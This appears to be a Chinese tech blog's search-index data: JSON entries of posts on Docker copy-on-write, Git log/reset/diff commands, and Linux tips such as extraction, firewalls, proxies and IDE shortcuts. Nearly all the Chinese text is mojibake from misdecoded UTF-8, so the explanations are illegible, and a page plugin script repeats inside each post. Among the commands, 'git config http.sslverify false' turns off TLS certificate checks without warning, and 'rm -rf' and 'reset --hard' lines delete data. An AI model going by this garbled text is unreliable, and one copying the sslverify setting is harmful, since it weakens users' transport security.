é™¤æ–‡ä»¶æ—¶ï¼ŒDocker ä¹Ÿæ˜¯ä»ä¸Šå¾€ä¸‹ä¾æ¬¡åœ¨é•œåƒå±‚ä¸­æŸ¥æ‰¾æ­¤æ–‡ä»¶ã€‚æ‰¾åˆ°åï¼Œä¼šåœ¨å®¹å™¨å±‚ä¸­è®°å½•ä¸‹æ­¤åˆ é™¤æ“ä½œã€‚ ä¸Šé¢çš„æ“ä½œä¸­ï¼Œåªæœ‰å½“éœ€è¦ä¿®æ”¹æ—¶æ‰å¤åˆ¶ä¸€ä»½æ•°æ®ï¼Œè¿™ç§ç‰¹æ€§è¢«ç§°ä½œå†™æ—¶å¤åˆ¶ï¼ˆcopy-on-writeï¼‰ã€‚å¯è§å®¹å™¨å±‚ä¿å­˜çš„æ˜¯é•œåƒå˜åŒ–çš„éƒ¨åˆ†ï¼Œä¸ä¼šå¯¹é•œåƒæœ¬èº«è¿›è¡Œä»»ä½•ä¿®æ”¹ã€‚å®¹å™¨å±‚è®°å½•å¯¹é•œåƒçš„ä¿®æ”¹ï¼Œæ‰€æœ‰é•œåƒå±‚éƒ½æ˜¯åªè¯»çš„ï¼Œä¸ä¼šè¢«å®¹å™¨ä¿®æ”¹ï¼Œæ‰€ä»¥é•œåƒå¯ä»¥è¢«å¤šä¸ªå®¹å™¨å…±äº«ã€‚ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"å®¹å™¨åŒ–"},{title:"Git ä¹‹äºŒ - æ˜¾ç¤ºæ—¥å¿—ã€æ¢å¤æ–‡ä»¶ã€æ¯”è¾ƒæ–‡ä»¶",url:"/posts/d8e8dbb.html",text:'Git æ˜¾ç¤ºæäº¤çš„æ—¥å¿—ä¿¡æ¯ï¼ˆæœ¬åœ°åº“ï¼‰1234567891011121314151617181920212223242526272829303132# æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„æ‰€æœ‰æ“ä½œçš„æ—¥å¿—ä¿¡æ¯(åŒ…æ‹¬commitå’Œresetçš„æ“ä½œ)ï¼Œä¸€èˆ¬ç”¨äºæ•°æ®æ¢å¤$ git reflog# æ˜¾ç¤ºæ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯çš„è¯¦ç»†å†…å®¹$ git log# æ˜¾ç¤ºæ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯çš„è¯¦ç»†å†…å®¹ï¼ŒåŒ…æ‹¬reflogçš„æ—¥å¿—ä¿¡æ¯$ git log -g# æ˜¾ç¤ºæ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯æ›´è¯¦ç»†çš„å†…å®¹$ git log --pretty=raw# å°†æ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯è¾“å‡ºä¸ºä¸€è¡Œæ˜¾ç¤º$ git log --pretty=oneline# å°†æ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯çš„æ‘˜è¦å†…å®¹è¾“å‡ºä¸ºä¸€è¡Œæ˜¾ç¤º$ git log --oneline# å°†æ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯çš„æ‘˜è¦å†…å®¹è¾“å‡ºä¸ºä¸€è¡Œæ˜¾ç¤ºï¼Œå¹¶æŒ‡å®šæ˜¾ç¤ºå¤šå°‘æ¡æ—¥å¿—$ git log --oneline -2# æŒ‡å®šä»ç¬¬å‡ æ¡æ—¥å¿—ä¿¡æ¯å¼€å§‹æ˜¾ç¤ºï¼Œä¾‹å¦‚ä»ç¬¬ä¸‰æ¡æ—¥å¿—ä¿¡æ¯å¼€å§‹æ˜¾ç¤º$ git log --skip 2# æ˜¾ç¤ºæ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯çš„è¯¦ç»†å†…å®¹ï¼ŒåŒ…å«æ¯æ¬¡æäº¤å¯¹åº”çš„æ–‡ä»¶æ“ä½œç±»å‹ï¼ˆå¢åˆ æ”¹ï¼‰$ git log --name-status# æ˜¾ç¤ºæ¯æ¡æäº¤æ—¥å¿—ä¿¡æ¯çš„è¯¦ç»†å†…å®¹ï¼ŒåŒ…å«æ–‡ä»¶è¯¦ç»†çš„æ”¹åŠ¨è®°å½•$ git log -p# ç»˜åˆ¶æäº¤çš„çº¿ç´¢å›¾$ git log --graph Git æœç´¢æäº¤çš„æ—¥å¿—ä¿¡æ¯ï¼ˆæœ¬åœ°åº“ï¼‰12345678# åŒ¹é…ç­¾åä¿¡æ¯ï¼ˆä¾‹å¦‚ï¼šâ€œpeter@gmail.comâ€ï¼‰ä¸­çš„ä»»æ„å†…å®¹ï¼Œæœç´¢æŸäººæäº¤çš„æ‰€æœ‰æ—¥å¿—ä¿¡æ¯$ git log --author peter# æ ¹æ®æäº¤æ—¶å¡«å†™çš„å¤‡æ³¨ä¿¡æ¯ï¼Œæœç´¢æäº¤çš„æ—¥å¿—ä¿¡æ¯$ git log --grep keywords# æœç´¢æŸä¸ªæ–‡ä»¶çš„æ‰€æœ‰æ”¹åŠ¨è®°å½•ï¼Œå‚æ•°æ˜¯æ–‡ä»¶å®Œæ•´çš„ç›¸å¯¹è·¯å¾„æˆ–è€…ç»å¯¹è·¯å¾„$ git log -p -- config/my.config Git æ¢å¤åˆ°æŸä¸ªæäº¤çš„å†å²ç‰ˆæœ¬ï¼ˆæœ¬åœ°åº“ï¼‰æ­¤æ“ä½œé€‚ç”¨äºæ–‡ä»¶çš„åˆ é™¤æˆ–ä¿®æ”¹æ“ä½œ commit ä¹‹åï¼Œæƒ³æ‰¾å›å·²åˆ é™¤çš„æ–‡ä»¶ï¼Œæˆ–è€…å°†æ–‡ä»¶è¿˜åŸåˆ°ä¿®æ”¹å‰çš„æŸä¸ªå†å²ç‰ˆæœ¬ï¼ŒæˆåŠŸçš„å‰ææ˜¯è¢«åˆ é™¤æˆ–è€…è¢«ä¿®æ”¹çš„æ–‡ä»¶å¿…é¡»æ›¾ç» commit åˆ°æœ¬åœ°åº“ 12345678910111213141516171819202122232425262728# æŸ¥çœ‹æ‰€æœ‰åˆ†æ”¯çš„æ‰€æœ‰æ“ä½œçš„æ—¥å¿—ä¿¡æ¯(åŒ…æ‹¬commitå’Œresetçš„æ“ä½œ)ï¼Œä¸€èˆ¬ç”¨äºæ•°æ®æ¢å¤$ git reflog4630fa3 HEAD@{0}: commit: update message346f528 HEAD@{1}: commit: update messageb86daaa HEAD@{2}: commit: update messagefdbbf3c HEAD@{3}: commit: update message775a0c5 HEAD@{4}: commit: update message42a3d41 HEAD@{5}: commit: update message81f4118 HEAD@{6}: commit: update message0c05880 HEAD@{7}: commit: update message670e552 HEAD@{8}: commit (initial): update message# åŸºäºç´¢å¼•å€¼æ¢å¤åˆ°æŒ‡å®šå†å²ç‰ˆæœ¬ï¼ˆæ¨èï¼‰ï¼Œå¯ä»¥éšæ„å¾€å‰å¾€åæ¢å¤$ git reset --hard 346f528# åŸºäº^ç¬¦å·æ¢å¤ï¼ˆåªèƒ½å¾€åæ¢å¤ï¼‰ï¼Œå½“åŒæ—¶ä½¿ç”¨Nä¸ª^ç¬¦å·æ—¶ï¼Œè¡¨ç¤ºé¡ºåºå¾€åæ¢å¤Nä¸ªç‰ˆæœ¬$ git reset --hard HEAD^# åŸºäº~ç¬¦å·æ¢å¤ï¼ˆåªèƒ½å¾€åæ¢å¤ï¼‰ï¼Œæ•°å­—Nè¡¨ç¤ºé¡ºåºå¾€åæ¢å¤Nä¸ªç‰ˆæœ¬$ git reset --hard HEAD~1# æ¢å¤åˆ°å½“å‰æœ¬åœ°åº“ä¸­HEADæŒ‡é’ˆæŒ‡å‘çš„å†å²ç‰ˆæœ¬ï¼Œä¸€èˆ¬æŒ‡çš„å°±æ˜¯HEAD@{0}$ git reset --hard HEAD# resetæ“ä½œçš„å®šä¹‰åŸŸï¼ˆå¿…é¡»æ˜ç¡®æŒ‡å®šï¼Œå¦åˆ™å¯èƒ½é€ æˆæ•°æ®ä¸å¯æ¢å¤çš„ä¸¢å¤±ï¼‰$ git reset --soft åªåœ¨æœ¬åœ°åº“ç§»åŠ¨HEADæŒ‡é’ˆï¼Œæš‚å­˜åŒºå’Œå·¥ä½œåŒºéƒ½ä¸ä¼šå—å½±å“$ git reset --mixed é»˜è®¤é€‰é¡¹ï¼Œåœ¨æœ¬åœ°åº“ç§»åŠ¨HEADæŒ‡é’ˆï¼Œæš‚å­˜åŒºåŒæ­¥åˆ°æŒ‡å®šçš„æäº¤ï¼Œå·¥ä½œåŒºä¸å—å½±å“$ git reset --hard åœ¨æœ¬åœ°åº“ç§»åŠ¨HEADæŒ‡é’ˆï¼Œæš‚å­˜åŒºå’Œå·¥ä½œåŒºéƒ½åŒæ­¥åˆ°æŒ‡å®šçš„æäº¤ï¼Œå¼ºçƒˆå»ºè®®é¢„å…ˆæ‰§è¡Œä¸€æ¬¡commitæ“ä½œï¼Œå¦åˆ™å¯èƒ½é€ æˆæ•°æ®ä¸å¯æ¢å¤çš„ä¸¢å¤± Git å°†æŸä¸ªæ–‡ä»¶å›æ»šåˆ°æŒ‡å®šç‰ˆæœ¬åœ¨ä½¿ç”¨ Git æ—¶ï¼Œå¯èƒ½ä¼šé‡åˆ°è¿™ç§é—®é¢˜ï¼šä¸€æ¬¡ commit äº†å¤šä¸ªæ–‡ä»¶ï¼Œä½†æ˜¯æäº¤åå‘ç°æœ‰ä¸€ä¸ªæ–‡ä»¶ä¸åº”è¯¥è¢«æäº¤ï¼Œå¦‚æœæŠŠæ•´ä¸ª commit å›æ»šä¼šå¾ˆéº»çƒ¦ï¼ˆå› ä¸ºæ­£ç¡®æäº¤çš„æ–‡ä»¶ä¹Ÿä¼šè¢«å›æ»šï¼‰ï¼Œè¿™æ—¶å°±éœ€è¦å•ç‹¬å›æ»šæŸä¸ªæ–‡ä»¶ï¼Œå…·ä½“æ“ä½œå¦‚ä¸‹ï¼š 12345678# é¦–å…ˆæ‰¾åˆ°ç‰¹å®šæ–‡ä»¶è¦å›æ»šçš„ç‰ˆæœ¬çš„hashå€¼$ git log api.json# åˆ©ç”¨hashå€¼å›æ»šç‰¹å®šæ–‡ä»¶ï¼ˆå¯ä»¥ç›´æ¥ä½¿ç”¨hashå€¼çš„å‰å…­ä½ï¼‰$ git checkout 2d1ed0 api.json# æäº¤å›æ»šåçš„æ–‡ä»¶$ git commit -m api.json Git æ¯”è¾ƒæ–‡ä»¶å·®å¼‚ï¼ˆæœ¬åœ°åº“ï¼‰12345678910# å°†å·¥ä½œåŒºçš„æ–‡ä»¶ä¸æš‚å­˜åŒºçš„æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒ$ git diff api.json# å°†å·¥ä½œåŒºçš„æ–‡ä»¶å’Œæœ¬åœ°åº“ä¸­HEADæŒ‡é’ˆæŒ‡å‘çš„å†å²ç‰ˆæœ¬çš„æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒ$ git diff HEAD api.json# å°†å·¥ä½œåŒºçš„æ–‡ä»¶å’Œæœ¬åœ°åº“ä¸Šä¸€ä¸ªå†å²ç‰ˆæœ¬çš„æ–‡ä»¶è¿›è¡Œæ¯”è¾ƒ$ git diff HEAD^ api.json# æ³¨æ„ï¼šå½“â€œgit diffâ€å‘½ä»¤ä¸æŒ‡å®šæ–‡ä»¶åå‚æ•°ï¼Œåˆ™ä»£è¡¨æ¯”è¾ƒå·¥ä½œåŒºçš„æ‰€æœ‰æ–‡ä»¶ var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"ç‰ˆæœ¬æ§åˆ¶"},{title:"æ—¥å¸¸ç¼–ç¨‹å¼€å‘æŠ€å·§ä¹‹ä¸€",url:"/posts/533ecd67.html",text:'Linux å‘è¡Œç‰ˆ 12345Archç³»ï¼šArchLinux/Antergos/ManjaroRedhatç³»ï¼šCentOS/Fedora/Mageia/openSUSEDebianç³»ï¼šDebian/Ubuntu/Kali/Kubuntu/LinuxMint/Deepin/UbuntuKylinLinuxæ’è¡Œæ¦œä¸Linuxå®æ—¶èµ„è®¯ç«™ç‚¹ï¼šhttps://distrowatch.com/ Google æœç´¢å¼•æ“æŒ‡å®šæœç´¢çš„è¯­è¨€èŒƒå›´ 12345678é»˜è®¤ï¼š å…¨çƒå„ç§è¯­è¨€çš„æœç´¢ç»“æœè‹±æ–‡ï¼š &amp;lr=lang_enæ—¥æ–‡ï¼š &amp;lr=lang_jaä¸­æ–‡ï¼š &amp;lr=lang_zh-CNä¸­æ–‡ï¼ˆå«å°æ¹¾ï¼‰ï¼š &amp;lr=lang_zh-CN%7Clang_zh-TWä¸¾ä¾‹åªæœç´¢ä¸­æ–‡ç›¸å…³çš„Javaå†…å®¹ï¼šhttps://www.google.com/search?lr=lang_zh-CN&amp;q=Java SSH å®¢æˆ·ç«¯é€šè¿‡ Socker5 ä»£ç†è¿æ¥åˆ° Linux ç›®æ ‡æœåŠ¡å™¨ 12# ä¸‹é¢Socker5ä»£ç†æœåŠ¡å™¨çš„IPå’Œç«¯å£æ˜¯127.0.0.1å’Œ1080ï¼ŒLinuxç›®æ ‡æœåŠ¡å™¨çš„IP/åŸŸåæ˜¯192.168.1.1ï¼Œå…¶ä¸­Socker5ä»£ç†æœåŠ¡å¯ä»¥æ˜¯SS/SSRã€Tor...$ ssh -o ProxyCommand=\'nc -x 127.0.0.1:1080 %h %p\' root@192.168.1.1 Linux è§£å‹æ–‡ä»¶ 1234567891011121314151617181920212223242526# è§£å‹.raråç¼€çš„æ–‡ä»¶$ unrar x xxx.rar# è§£å‹.raråç¼€çš„æ–‡ä»¶ï¼Œè‹¥æ–‡ä»¶å­˜åœ¨åˆ™ç›´æ¥è¦†ç›–$ unrar x -o+ xxx.rar# æŒ‡å®šç›®å½•æ·±åº¦ï¼Œè§£å‹ç›®å½•ä¸‹çš„æ‰€æœ‰RARæ–‡ä»¶$ find -maxdepth 1 -name \'*.rar\' | xargs -i unrar x {}# è§£å†³unzipè§£å‹æ–‡ä»¶åï¼Œå‡ºç°ä¸­æ–‡æ–‡ä»¶åä¹±ç çš„é—®é¢˜$ unzip -O CP936 xxx.zip# é€šè¿‡upzipè§£å‹æ–‡ä»¶åˆ°æŒ‡å®šçš„ç›®å½•ï¼Œå‰ææ˜¯æŒ‡å®šçš„ç›®å½•å¿…é¡»å­˜åœ¨$ unzip -d /usr/local gradle-5.4.1-bin.zip# æŒ‡å®šç›®å½•æ·±åº¦ï¼Œè§£å‹ç›®å½•ä¸‹çš„æ‰€æœ‰ZIPæ–‡ä»¶$ find -maxdepth 1 -name "*.zip" | xargs -i unzip -O CP936 {}# æŒ‡å®šè§£å‹ç›®å½•ï¼Œå‰ææ˜¯æŒ‡å®šçš„ç›®å½•å¿…é¡»å­˜åœ¨$ tar -xvf apache-maven-2.6.tar.gz -C /home/www/apache-maven-2.6# è§£å‹.7zåç¼€çš„æ–‡ä»¶ï¼ˆä¸ä¿æŒç›®å½•ç»“æ„ï¼‰$ 7za e data.7z# è§£å‹.7zåç¼€çš„æ–‡ä»¶ï¼ˆä¿æŒç›®å½•ç»“æ„ï¼‰$ 7za x data.7z Linux å¼ºåˆ¶åˆ é™¤æŸ¥æ‰¾åˆ°çš„æ–‡ä»¶ 12345# å¼ºåˆ¶åˆ é™¤å½“å‰ç›®å½•ä¸‹æ–‡ä»¶åä»¥downloadingç»“å°¾çš„æ‰€æœ‰æ–‡ä»¶$ find . -name "*downloading" | xargs rm -rf# æˆ–è€…ä½¿ç”¨-IæŒ‡å®šä¸€ä¸ªæ›¿æ¢å­—ç¬¦ä¸²{}ï¼Œè¿™ä¸ªå­—ç¬¦ä¸²åœ¨xargsæ‰©å±•æ—¶ä¼šè¢«æ›¿æ¢æ‰ï¼Œå½“-Iä¸xargsç»“åˆä½¿ç”¨ï¼Œæ¯ä¸€ä¸ªå‚æ•°å‘½ä»¤éƒ½ä¼šè¢«æ‰§è¡Œä¸€æ¬¡$ find . -name "*downloading" | xargs -I {} rm -rf {} Linux æ–‡ä»¶ç»Ÿè®¡ 1234567891011121314# ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹æ–‡ä»¶ï¼ˆæŒ‡å®šåç¼€ï¼‰çš„æ€»ä¸ªæ•°$ find . -name "*.html" | wc -l# ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹æ¯ä¸ªæ–‡ä»¶ï¼ˆæŒ‡å®šåç¼€ï¼‰çš„æ€»è¡Œæ•°$ find . -name "*.html" | xargs wc -l# ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹æ¯ä¸ªæ–‡ä»¶ï¼ˆæŒ‡å®šåç¼€ï¼‰çš„æ€»å­—æ•°$ find . -name "*.html" | xargs wc -w# ç»Ÿè®¡å½“å‰ç›®å½•ä¸‹æ¯ä¸ªæ–‡ä»¶ï¼ˆæŒ‡å®šåç¼€ï¼‰çš„æ€»å­—èŠ‚æ•°$ find . -name "*.html" | xargs wc -c# ä¸åŠ ä»»ä½•å‚æ•°çš„wcä¼šç»Ÿè®¡æ–‡ä»¶çš„æ€»è¡Œæ•°ã€æ€»å­—æ•°ã€æ€»å­—èŠ‚æ•°$ find . -name "*.html" | xargs wc è§£å†³ Linux çš„ tree å‘½ä»¤ä¸èƒ½æ­£ç¡®æ˜¾ç¤ºä¸­æ–‡çš„é—®é¢˜ 12# æ·»åŠ -Nå‚æ•°$ tree -N Linux æ ¡éªŒæ–‡ä»¶çš„å“ˆå¸Œå€¼ 123456789101112131415# åŸºäºMD5åŠ å¯†ç®—æ³•ï¼Œè·å–æ–‡ä»¶çš„å“ˆå¸Œå€¼$ md5sum tomcat8.tar.gz# æˆ–è€…å°†å¾…æ ¡éªŒæ–‡ä»¶çš„æ­£ç¡®MD5å“ˆå¸Œå€¼å†™å…¥åˆ°æŒ‡å®šçš„æ–‡ä»¶ï¼Œç„¶åé€šè¿‡â€œmd5sum -câ€å‘½ä»¤è¾“å‡ºMD5å“ˆå¸Œå€¼æ¯”å¯¹çš„ç»“æœ$ vim tomcat8.md583aca9b98564ba4064aa0acad7360ceb tomcat8.tar.gz# è¾“å‡ºæ–‡ä»¶çš„MD5æ ¡éªŒç»“æœ$ md5sum -c tomcat8.md5tomcat8.tar.gz: OK# åŸºäºSHA1åŠ å¯†ç®—æ³•ï¼Œè·å–æ–‡ä»¶çš„å“ˆå¸Œå€¼$ sha1sum tomcat8.tar.gz# åŒä¸Šï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨â€œsha1sum -câ€å‘½ä»¤è¿›è¡ŒSHA1å“ˆå¸Œå€¼çš„æ¯”å¯¹ Git å¼ºåˆ¶æ›´æ–°å¹¶è¦†ç›–æœ¬åœ°ä»“åº“ä¸å·¥ä½œåŒºçš„æ–‡ä»¶ï¼Œå³æœ¬åœ°å¼ºåˆ¶åŒæ­¥è¿œç¨‹ä»“åº“çš„æ‰€æœ‰æ–‡ä»¶ 1$ git fetch --all &amp;&amp; git reset --hard origin/master &amp;&amp; git pull PM2 æœåŠ¡ç›¸å…³æ“ä½œå‘½ä»¤ 1234567891011121314# å¯åŠ¨æŸä¸ªåº”ç”¨$ sudo pm2 start api_server# å…³é—­æŸä¸ªåº”ç”¨$ sudo pm2 stop api_server# æŸ¥çœ‹æŸä¸ªåº”ç”¨çš„è¿è¡ŒçŠ¶æ€$ sudo pm2 show api_server# å¯ç”¨PM2å¼€æœºè‡ªå¯åŠ¨$ sudo systemctl enable pm2-root# ç¦ç”¨PM2å¼€æœºè‡ªå¯åŠ¨$ sudo systemctl disable pm2-root Centos7 é˜²ç«å¢™é…ç½® 123456789101112131415161718192021222324252627282930# åˆ‡æ¢è‡³Rootç”¨æˆ·$ su - root# æŸ¥çœ‹é˜²ç«å¢™è¿è¡ŒçŠ¶æ€# firewall-cmd --state# æŸ¥çœ‹é˜²ç«å¢™è¿è¡ŒçŠ¶æ€# systemctl status firewalld# å…³é—­é˜²ç«å¢™# systemctl stop firewalld# å¯ç”¨é˜²ç«å¢™# systemctl start firewalld# é…ç½®é˜²ç«å¢™æ°¸ä¹…å¼€æ”¾æŸä¸ªç«¯å£# firewall-cmd --zone=public --permanent --add-port=8080/tcp# firewall-cmd --zone=public --permanent --add-port=8080/udp# é…ç½®é˜²ç«å¢™å…³é—­å¼€æ”¾æŸä¸ªç«¯å£# firewall-cmd --zone=public --permanent --remove-port=8000/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹é˜²ç«å¢™å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports# æŸ¥çœ‹é˜²ç«å¢™å·²å¼€æ”¾çš„æœåŠ¡# firewall-cmd --list-services æŸ¥çœ‹ Linux ç³»ç»Ÿçš„å‘è¡Œç‰ˆæœ¬ 12345678910# ä»¥ä¸‹æ–¹æ³•ä¸­ï¼Œè‡³å°‘æœ‰ä¸€ç§æ–¹æ³•é€‚ç”¨äºRedhatã€SuSEã€Debianç³»çš„Linuxå‘è¡Œç‰ˆ# æ–¹æ³•ä¸€ï¼ˆåœ¨ä¸åŒLinuxå‘è¡Œç‰ˆä¸­ï¼Œlsb_releaseå‘½ä»¤ä¸ä¸€å®šéƒ½å­˜åœ¨ï¼‰$ lsb_release -a# æ–¹æ³•äºŒï¼ˆxxxä¸ºå‘è¡Œç‰ˆåç§°ï¼Œä¾‹å¦‚os-releaseã€centos-releaseï¼‰$ cat /etc/xxx-release# æ–¹æ³•ä¸‰$ cat /etc/issue Linux æŸ¥çœ‹ç«¯å£å ç”¨çš„æƒ…å†µ 12345# æŸ¥çœ‹ç«¯å£å ç”¨ï¼Œä¸”æ˜¾ç¤ºè¿›ç¨‹IDï¼ˆæ¨èï¼‰# netstat -anp|grep 80# æˆ–è€…ï¼ˆä¸æ˜¾ç¤ºè¿›ç¨‹IDï¼‰# netstat -aon|grep 80 Debian/Ubuntu é˜²ç«å¢™é…ç½® 12345678910111213141516171819202122232425# æŸ¥çœ‹é˜²ç«å¢™ç°æœ‰è§„åˆ™# ufw status# å¼€å¯é˜²ç«å¢™# ufw enable# å…³é—­é˜²ç«å¢™# ufw disable# å¼€æ”¾æŒ‡å®šçš„tcpã€udpç«¯å£# ufw allow 22/tcp# ufw allow 22/udp# åŒæ—¶å¼€æ”¾tcpä¸udpç«¯å£# ufw allow 22# åˆ é™¤å¼€æ”¾22ç«¯å£çš„è§„åˆ™# ufw delete allow 22# æ‹’ç»æŒ‡å®šçš„tcpã€udpç«¯å£# allow/deny 20/tcp# allow/deny 20/udp# ä¿å­˜é˜²ç«å¢™é…ç½®# ufw reload Git è®¾ç½®ä»£ç† 1234# ä¸‹é¢çš„http://127.0.0.1:8118æ˜¯ä»£ç†æœåŠ¡å™¨çš„è®¿é—®åœ°å€ï¼Œä¹Ÿå¯ä»¥æ˜¯æœ¬åœ°ä»£ç†å·¥å…·çš„è®¿é—®åœ°å€$ git config --global http.proxy http://127.0.0.1:8118$ git config --global https.proxy http://127.0.0.1:8118$ git config --global http.sslverify false YUM è®¾ç½®ä»£ç† 12345678910111213141516# æ–¹æ³•ä¸€# vim /etc/yum.confproxy=http://127.0.0.1:8118# æ–¹æ³•äºŒ# ä¸´æ—¶æ·»åŠ ç¯å¢ƒå˜é‡# export http_proxy=http://127.0.0.1:8118# export https_proxy=http://127.0.0.1:8118# æµ‹è¯•ä»£ç†# curl -I www.google.com# ç§»é™¤ç¯å¢ƒå˜é‡# unset http_proxy# unset https_proxy Eclipse å¸¸ç”¨å¿«æ·é”® 12345678910111213141516171819202122alt + /ï¼šä»£ç è¡¥å…¨ctrl + dï¼šåˆ é™¤å½“å‰è¡Œctrl + hï¼šæ‰“å¼€æœç´¢ç•Œé¢ctrl + wï¼šå…³é—­å½“å‰Tabé¡µcrtl + tï¼šæ˜¾ç¤ºç±»çš„ç»§æ‰¿å…³ç³»ctrl + fï¼šå½“å‰æŸ¥æ‰¾/å½“å‰æ›¿æ¢ctrl + shift + xï¼šè½¬æ¢ä¸ºå¤§å†™ctrl + shift + yï¼šè½¬æ¢ä¸ºå°å†™crtl + qï¼šè¿”å›åˆ°æœ€è¿‘ç¼–è¾‘çš„åœ°æ–¹ctrl + shift + fï¼šæ ¼å¼åŒ–ä»£ç ctrl + oï¼šæŸ¥çœ‹å½“å‰ç±»çš„å±æ€§ã€æ–¹æ³•ctrl + lï¼šå®šä½åˆ°å½“å‰æ–‡ä»¶çš„æŸä¸€è¡Œctrl + shift + oï¼šå¿«é€Ÿç”Ÿæˆå¯¼å…¥åŒ…ctrl + oï¼šæŸ¥çœ‹å½“å‰ç±»æ‰€æœ‰çš„æ–¹æ³•ã€å±æ€§ctrl + f1ï¼šå¿«é€Ÿæ˜¾ç¤ºé”™è¯¯ä»£ç çš„Fixæ–¹æ¡ˆalt + shift + rï¼šé‡å‘½åæ–¹æ³•åã€å±æ€§åf3ï¼šå¿«é€Ÿå®šä½å…‰æ ‡ä½ç½®çš„æŸä¸ªç±»ã€æ–¹æ³•ã€å±æ€§ctrl + shift + wï¼šå…³é—­æ‰“å¼€çš„æ‰€æœ‰Tabé¡µctrl + shift + gï¼šæŸ¥æ‰¾ç±»ã€æ–¹æ³•ã€å±æ€§è¢«å¼•ç”¨çš„æƒ…å†µalt + shift + wï¼šå¿«é€Ÿå®šä½å½“å‰æ–‡ä»¶æ‰€åœ¨é¡¹ç›®ä¸­çš„è·¯å¾„ctrl + shift + tï¼šå…¨å±€æŸ¥æ‰¾Javaç±»æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ctrl + shift + rï¼šå…¨å±€æŸ¥æ‰¾æ–‡ä»¶ï¼ˆåŒ…æ‹¬Javaç±»æ–‡ä»¶ï¼‰ï¼Œå¯ä»¥ä½¿ç”¨é€šé…ç¬¦ IntelliJ IDEA å¸¸ç”¨å¿«æ·é”® 123456789101112131415161718192021222324alt + /ï¼šä»£ç è¡¥å…¨ctrl + fï¼šå½“å‰æŸ¥æ‰¾ctrl + xï¼šåˆ é™¤å½“å‰è¡Œctrl + f4ï¼šå…³é—­å½“å‰Tabé¡µcrtl + hï¼šæ˜¾ç¤ºç±»çš„ç»§æ‰¿å…³ç³»alt + shift + fï¼šæ”¶è—ä»£ç ctrl + rï¼šå½“å‰æŸ¥æ‰¾/å½“å‰æ›¿æ¢ctrl + alt + lï¼šæ ¼å¼åŒ–ä»£ç ctrl + shift + uï¼šå¤§å°å†™è½¬æ¢ctrl + eï¼šæŸ¥çœ‹æœ€è¿‘æ‰“å¼€è¿‡çš„æ–‡ä»¶ctrl + alt + oï¼šå¿«é€Ÿç”Ÿæˆå¯¼å…¥åŒ…alt + leftï¼šè¿”å›åˆ°ä¸Šä¸€ä¸ªç¼–è¾‘çš„é¡µé¢alt + rightï¼šè¿›å…¥åˆ°ä¸‹ä¸€ä¸ªç¼–è¾‘çš„é¡µé¢ctrl + shift + vï¼šé€‰æ‹©è¦ç²˜è´´çš„å†…å®¹crtl + shift + rï¼šå…¨å±€æŸ¥æ‰¾/å…¨å±€æ›¿æ¢alt + enterï¼šä¸‡èƒ½è§£é”™/ç”Ÿæˆè¿”å›å€¼å˜é‡ctrl + alt + hï¼šæŸ¥çœ‹æ–¹æ³•è¢«å¼•ç”¨çš„æƒ…å†µshift + f6ï¼šæ›´æ”¹æ–‡ä»¶åã€æ–¹æ³•åã€å±æ€§åctrl + f12ï¼šæŸ¥çœ‹å½“å‰ç±»æ‰€æœ‰çš„æ–¹æ³•ã€å±æ€§ctrl + alt + uï¼šåœ¨å½“å‰Tabé¡µæ˜¾ç¤ºç±»çš„ç»§æ‰¿ç»“æ„å›¾ctrl + shift+i --&gt; ctrl + enterï¼šæŸ¥çœ‹Javaæºç ctrl + shift + â€+/-â€ï¼šå±•å¼€å…¨éƒ¨ä»£ç ã€æŠ˜å å…¨éƒ¨ä»£ç ctrl + alt + shift + uï¼šåœ¨æ–°çš„Tabé¡µæ˜¾ç¤ºç±»çš„ç»§æ‰¿ç»“æ„å›¾ctrl + nï¼šå…¨å±€æœç´¢æ™®é€šæ–‡ä»¶ä¸Javaç±»æ–‡ä»¶ï¼Œè‹¥éœ€è¦æœç²ŸåŒ…æ‹¬JaråŒ…é‡Œé¢çš„å†…å®¹ï¼Œéœ€è¦å‹¾é€‰â€œinclude non-project classesâ€é€‰é¡¹ Centos7 é‡å¯ IBUS è¾“å…¥æ³• 1# ibus-daemon -r -d -x Centos7 æ—¶é—´åŒæ­¥ 1234567891011121314151617181920212223242526272829303132# 